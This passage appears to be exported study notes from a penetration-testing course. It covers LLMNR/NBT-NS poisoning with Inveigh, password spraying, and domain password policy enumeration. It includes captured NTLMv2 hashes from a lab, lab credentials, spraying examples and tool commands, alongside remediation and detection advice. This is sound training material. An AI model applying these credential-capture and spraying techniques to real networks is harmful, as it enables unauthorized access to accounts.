Disabled\n[+] NBNS Spoofer For Types 00,20 = Enabled\n[+] NBNS TTL = 165 Seconds\n[+] SMB Capture = Enabled\n[+] HTTP Capture = Enabled\n[+] HTTPS Certificate Issuer = Inveigh\n[+] HTTPS Certificate CN = localhost\n[+] HTTPS Capture = Enabled\n[+] HTTP/HTTPS Authentication = NTLM\n[+] WPAD Authentication = NTLM\n[+] WPAD NTLM Authentication Ignore List = Firefox\n[+] WPAD Response = Enabled\n[+] Kerberos TGT Capture = Disabled\n[+] Machine Account Capture = Disabled\n[+] Console Output = Full\n[+] File Output = Enabled\n[+] Output Directory = C:\\Tools\nWARNING: [!] Run Stop-Inveigh to stop\n[*] Press any key to stop console output\nWARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener\nWARNING: [!] [2022-02-28T19:26:31] Exception calling \"Start\" with \"0\" argument(s): \"An attempt was made to access a\nsocket in a way forbidden by its access permissions\" $HTTP_listener.Start()\n[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834\n[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834\n[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834\n\n<SNIP>\n```\n\nWe can see that we immediately begin getting LLMNR and mDNS requests. The below animation shows the tool in action.\n\n![GIF showcasing the usage of the Inveigh PowerShell module in a PowerShell terminal.](https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png)\n\n---\n\n## C# Inveigh (InveighZero)\n\nThe PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. To save time, we have included a copy of both the PowerShell and compiled executable version of the tool in the `C:\\Tools` folder on the target host in the lab, but it is worth walking through the exercise (and best practice) of compiling it yourself using Visual Studio.\n\nLet's go ahead and run the C# version with the defaults and start capturing hashes.\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\nPS C:\\htb> .\\Inveigh.exe\n\n[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]\n[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[ ] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[ ] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[ ] MDNS\n[ ] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[ ] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[ ] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Tools]\n[+] Previous Session Files (Not Found)\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start HTTP listener on port 80, check IP and port usage.\n[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n```\n\nAs we can see, the tool starts and shows which options are enabled by default and which are not. The options with a `[+]` are default and enabled by default and the ones with a `[ ]` before them are disabled. The running console output also shows us which options are disabled and, therefore, responses are not being sent (mDNS in the above example). We can also see the message `Press ESC to enter/exit interactive console`, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.\n\nWe can hit the `esc` key to enter the console while Inveigh is running.\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\n\n<SNIP>\n\n[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310\n[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311\nC(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP\n```\n\nAfter typing `HELP` and hitting enter, we are presented with several options:\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\n\n=============================================== Inveigh Console Commands ===============================================\n\nCommand                           Description\n========================================================================================================================\nGET CONSOLE                     | get queued console output\nGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses\nGET LOG                         | get log entries; add search string to filter results\nGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results\nGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results\nGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results\nGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results\nGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes\nGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes\nGET CLEARTEXT                   | get captured cleartext credentials\nGET CLEARTEXTUNIQUE             | get unique captured cleartext credentials\nGET REPLYTODOMAINS              | get ReplyToDomains parameter startup values\nGET REPLYTOHOSTS                | get ReplyToHosts parameter startup values\nGET REPLYTOIPS                  | get ReplyToIPs parameter startup values\nGET REPLYTOMACS                 | get ReplyToMACs parameter startup values\nGET IGNOREDOMAINS               | get IgnoreDomains parameter startup values\nGET IGNOREHOSTS                 | get IgnoreHosts parameter startup values\nGET IGNOREIPS                   | get IgnoreIPs parameter startup values\nGET IGNOREMACS                  | get IgnoreMACs parameter startup values\nSET CONSOLE                     | set Console parameter value\nHISTORY                         | get command history\nRESUME                          | resume real time console output\nSTOP                            | stop Inveigh\n```\n\nWe can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\n\n================================================= Unique NTLMv2 Hashes =================================================\n\nHashes\n========================================================================================================================\nbackupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000\nforend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000\n\n<SNIP>\n```\n\nWe can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\n\n=================================================== NTLMv2 Usernames ===================================================\n\nIP Address                        Host                              Username                          Challenge\n========================================================================================================================\n172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\\backupagent       | B5013246091943D7\n172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\\forend            | 32FD89BD78804B04\n172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\\clusteragent      | 28BF08D82FA998E4\n172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\\wley              | 277AC2ED022DB4F7\n172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\\svc_qualys        | 5F9BB670D23F23ED\n```\n\nLet's start Inveigh and then interact with the output a bit to put it all together.\n\n![GIF showcasing the usage of the Inveigh executable file.](https://academy.hackthebox.com/storage/modules/143/inveigh_csharp.png)\n\n---\n\n## Remediation\n\nMitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.\n\nThere are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.\n\nWe can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling \"Turn OFF Multicast Name Resolution.\"\n\n![Group Policy Management Editor showing DNS Client settings, 'Turn off multicast name resolution' not configured.](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)\n\nNBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.\n\n![Advanced TCP/IP Settings window showing WINS addresses, LMHOSTS lookup enabled, and NetBIOS settings options.](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)\n\nWhile it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:\n\nCode: powershell\n\n```powershell\n\n$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\"\nGet-ChildItem $regkey |foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}\n```\n\nIn the Local Group Policy Editor, we will need to double click on `Startup`, choose the `PowerShell Scripts` tab, and select \"For this GPO, run scripts in the following order\" to `Run Windows PowerShell scripts first`, and then click on `Add` and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.\n\n![Local Group Policy Editor showing startup scripts with a PowerShell script path 'C:\\Users\\ab_adm...' configured.](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)\n\nTo push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:\n\n`\\\\inlanefreight.local\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts`\n\nOnce the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.\n\n![Group Policy Management Editor showing startup script 'disable-lbtbns.ps1' configured for PowerShell.](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png)\n\nOther mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.\n\n---\n\n## Detection\n\nIt is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.\n\nFurthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for. Finally, we can monitor the registry key `HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient` for changes to the `EnableMulticast` DWORD value. A value of `0` would mean that LLMNR is disabled.\n\n---\n\n## Moving On\n\nWe've now captured hashes for several accounts. At this point in our assessment, we would want to perform enumeration using a tool such as BloodHound to determine whether any or all of these hashes are worth cracking. If we get lucky and crack a hash for a user account with some privileged access or rights, we can begin expanding our reach into the domain. We may even get very lucky and crack the hash for a Domain Admin user! If we were unlucky in cracking hashes or cracked some but did not yield any fruit, then perhaps password spraying (which we will cover in-depth in the following few sections) will be more successful.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/09- Password Spraying Overview",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/09- Password Spraying Overview.md",
    "title": "09  Password Spraying Overview",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Password Spraying Overview --- Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed s...",
    "category": "02_CPTS",
    "content": "# Password Spraying Overview\n\n---\n\nPassword spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.\n\n---\n\n## Story Time\n\nPassword spraying can be a very effective way to gain a foothold internally. There are many times that this technique has helped me land a foothold during my assessments. Keep in mind that these examples come from non-evasive \"grey box\" assessments where I had internal network access with a Linux VM and a list of in-scope IP ranges and nothing else.\n\n### Scenario 1\n\nIn this first example, I performed all my standard checks and could not find anything useful like an SMB NULL session or LDAP anonymous bind that could allow me to retrieve a list of valid users. So I decided to use the `Kerbrute` tool to build a target username list by enumerating valid domain users (a technique we will cover later in this section). To create this list, I took the `jsmith.txt` username list from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and combined this with results that I got from scraping LinkedIn. With this combined list in hand, I enumerated valid users with `Kerbrute` and then used the same tool to password spray with the common password `Welcome1`. I got two hits with this password for very low privileged users, but this gave me enough access within the domain to run BloodHound and eventually identify attack paths that led to domain compromise.\n\n### Scenario 2\n\nIn the second assessment, I was faced with a similar setup, but enumerating valid domain users with common username lists, and results from LinkedIn did not yield any results. I turned to Google and searched for PDFs published by the organization. My search generated many results, and I confirmed in the document properties of 4 of them that the internal username structure was in the format of `F9L8`, randomly generated GUIDs using just capital letters and numbers (`A-Z and 0-9`). This information was published with the document in the `Author` field and shows the importance of scrubbing document metadata before posting anything online. From here, a short Bash script could be used to generate 1,679,616 possible username combinations.\n\nCode: bash\n\n```bash\n\n#!/bin/bash\n\nfor x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}\n    do echo $x;\ndone\n```\n\nI then used the generated username list with `Kerbrute` to enumerate every single user account in the domain. This attempt to make it more difficult to enumerate usernames ended up with me being able to enumerate every single account in the domain because of the predictable GUID in use combined with the PDF metadata I could locate and greatly facilitated the attack. Typically, I can only identify 40-60% of valid accounts using a list such as `jsmith.txt`. In this example, I significantly increased my chances of a successful password spraying attack by starting the attack with ALL domain accounts in my target list. From here, I obtained valid passwords for a few accounts. Eventually, I was able to follow a complicated attack chain involving [Resource-Based Constrained Delegation (RBCD)](https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a) and the [Shadow Credentials](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition) attack to ultimately gain control over the domain.\n\n---\n\n## Password Spraying Considerations\n\nWhile password spraying is useful for a penetration tester or red teamer, careless use may cause considerable harm, such as locking out hundreds of production accounts. One example is brute-forcing attempts to identify the password for an account using a long list of passwords. In contrast, password spraying is a more measured attack, utilizing very common passwords across multiple industries. The below table visualizes a password spray.\n\n#### Password Spray Visualization\n\n|**Attack**|**Username**|**Password**|\n|---|---|---|\n|1|bob.smith@inlanefreight.local|Welcome1|\n|1|john.doe@inlanefreight.local|Welcome1|\n|1|jane.doe@inlanefreight.local|Welcome1|\n|DELAY|||\n|2|bob.smith@inlanefreight.local|Passw0rd|\n|2|john.doe@inlanefreight.local|Passw0rd|\n|2|jane.doe@inlanefreight.local|Passw0rd|\n|DELAY|||\n|3|bob.smith@inlanefreight.local|Winter2022|\n|3|john.doe@inlanefreight.local|Winter2022|\n|3|jane.doe@inlanefreight.local|Winter2022|\n\nIt involves sending fewer login requests per username and is less likely to lock out accounts than a brute force attack. However, password spraying still presents a risk of lockouts, so it is essential to introduce a delay between login attempts. Internal password spraying can be used to move laterally within a network, and the same considerations regarding account lockouts apply. However, it may be possible to obtain the domain password policy with internal access, significantly lowering this risk.\n\nIt’s common to find a password policy that allows five bad attempts before locking out the account, with a 30-minute auto-unlock threshold. Some organizations configure more extended account lockout thresholds, even requiring an administrator to unlock the accounts manually. If you don’t know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset. It is best to obtain the password policy before attempting the attack during an internal assessment, but this is not always possible. We can err on the side of caution and either choose to do just one targeted password spraying attempt using a weak/common password as a \"hail mary\" if all other options for a foothold or furthering access have been exhausted. Depending on the type of assessment, we can always ask the client to clarify the password policy. If we already have a foothold or were provided a user account as part of testing, we can enumerate the password policy in various ways. Let's practice this in the next section.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/10-Enumerating & Retrieving Password Policies",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/10-Enumerating & Retrieving Password Policies.md",
    "title": "10 Enumerating & Retrieving Password Policies",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Enumerating the Password Policy - from Linux - Credentialed As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and...",
    "category": "02_CPTS",
    "content": "\n---\n\n## Enumerating the Password Policy - from Linux - Credentialed\n\nAs stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient`.\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\ndrxh3kr@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\avazquez:Password123 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \tDomain Refuse Password Change: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \tDomain Password Store Cleartext: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \tDomain Password Lockout Admins: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \tDomain Password No Clear Change: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \tDomain Password No Anon Change: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \tDomain Password Complex: 1\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set\n```\n\n---\n\n## Enumerating the Password Policy - from Linux - SMB NULL Sessions\n\nWithout credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.\n\nWhen creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as `enum4linux`, `CrackMapExec`, `rpcclient`, etc.\n\nWe can use [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) to check a Domain Controller for SMB NULL session access.\n\nOnce connected, we can issue an RPC command such as `querydominfo` to obtain information about the domain and confirm NULL session access.\n\n#### Using rpcclient\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\ndrxh3kr@htb[/htb]$ rpcclient -U \"\" -N 172.16.5.5\n\nrpcclient $> querydominfo\nDomain:\t\tINLANEFREIGHT\nServer:\t\t\nComment:\t\nTotal Users:\t3650\nTotal Groups:\t0\nTotal Aliases:\t37\nSequence No:\t1\nForce Logoff:\t-1\nDomain Server State:\t0x1\nServer Role:\tROLE_DOMAIN_PDC\nUnknown 3:\t0x1\n```\n\nWe can also obtain the password policy. We can see that the password policy is relatively weak, allowing a minimum password of 8 characters.\n\n#### Obtaining the Password Policy using rpcclient\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\nrpcclient $> querydominfo\n\nDomain:\t\tINLANEFREIGHT\nServer:\t\t\nComment:\t\nTotal Users:\t3650\nTotal Groups:\t0\nTotal Aliases:\t37\nSequence No:\t1\nForce Logoff:\t-1\nDomain Server State:\t0x1\nServer Role:\tROLE_DOMAIN_PDC\nUnknown 3:\t0x1\nrpcclient $> getdompwinfo\nmin_password_length: 8\npassword_properties: 0x00000001\n\tDOMAIN_PASSWORD_COMPLEX\n```\n\n---\n\nLet's try this using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux). `enum4linux` is a tool built around the [Samba suite of tools](https://www.samba.org/samba/docs/current/man-html/samba.7.html) `nmblookup`, `net`, `rpcclient` and `smbclient` to use for enumeration of windows hosts and domains. It can be found pre-installed on many different penetration testing distros, including Parrot Security Linux. Below we have an example output displaying information that can be provided by `enum4linux`. Here are some common enumeration tools and the ports they use:\n\n|Tool|Ports|\n|---|---|\n|nmblookup|137/UDP|\n|nbtstat|137/UDP|\n|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|\n|rpcclient|135/TCP|\n|smbclient|445/TCP|\n\n#### Using enum4linux\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\ndrxh3kr@htb[/htb]$ enum4linux -P 172.16.5.5\n\n<SNIP>\n\n ================================================== \n|    Password Policy Information for 172.16.5.5    |\n ================================================== \n\n[+] Attaching to 172.16.5.5 using a NULL share\n[+] Trying protocol 139/SMB...\n\n\t[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)\n\n[+] Trying protocol 445/SMB...\n[+] Found domain(s):\n\n\t[+] INLANEFREIGHT\n\t[+] Builtin\n\n[+] Password Info for Domain: INLANEFREIGHT\n\n\t[+] Minimum password length: 8\n\t[+] Password history length: 24\n\t[+] Maximum password age: Not Set\n\t[+] Password Complexity Flags: 000001\n\n\t\t[+] Domain Refuse Password Change: 0\n\t\t[+] Domain Password Store Cleartext: 0\n\t\t[+] Domain Password Lockout Admins: 0\n\t\t[+] Domain Password No Clear Change: 0\n\t\t[+] Domain Password No Anon Change: 0\n\t\t[+] Domain Password Complex: 1\n\n\t[+] Minimum password age: 1 day 4 minutes \n\t[+] Reset Account Lockout Counter: 30 minutes \n\t[+] Locked Account Duration: 30 minutes \n\t[+] Account Lockout Threshold: 5\n\t[+] Forced Log off Time: Not Set\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Enabled\nMinimum Password Length: 8\n\nenum4linux complete on Tue Feb 22 17:39:29 2022\n```\n\nThe tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of `enum4linux` in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features\n\n#### Using enum4linux-ng\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\ndrxh3kr@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight\n\nENUM4LINUX - next generation\n\n<SNIP>\n\n =======================================\n|    RPC Session Check on 172.16.5.5    |\n =======================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user session\n[-] Could not establish random user session: STATUS_LOGON_FAILURE\n\n =================================================\n|    Domain Information via RPC for 172.16.5.5    |\n =================================================\n[+] Domain: INLANEFREIGHT\n[+] SID: S-1-5-21-3842939050-3880317879-2865463114\n[+] Host is part of a domain (not a workgroup)\n =========================================================\n|    Domain Information via SMB session for 172.16.5.5    |\n========================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: 